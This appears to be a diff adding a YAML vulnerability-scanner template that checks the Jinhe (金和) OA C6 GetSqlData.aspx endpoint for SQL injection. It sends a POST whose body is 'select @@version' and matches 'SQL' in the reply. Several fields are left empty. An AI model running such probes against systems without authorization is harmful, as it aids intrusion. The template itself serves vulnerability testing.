@@ -1,0 +1,20 @@
+id:
+
+info:
+  name: 金和OA C6GetSqlData.aspx SQL 注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /C6/Control/GetSqlData.aspx/.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+    Accept-Encoding: gzip, deflate
+  data: |
+    select @@version
+response1:
+  body: SQL
+requests2:
+response2:
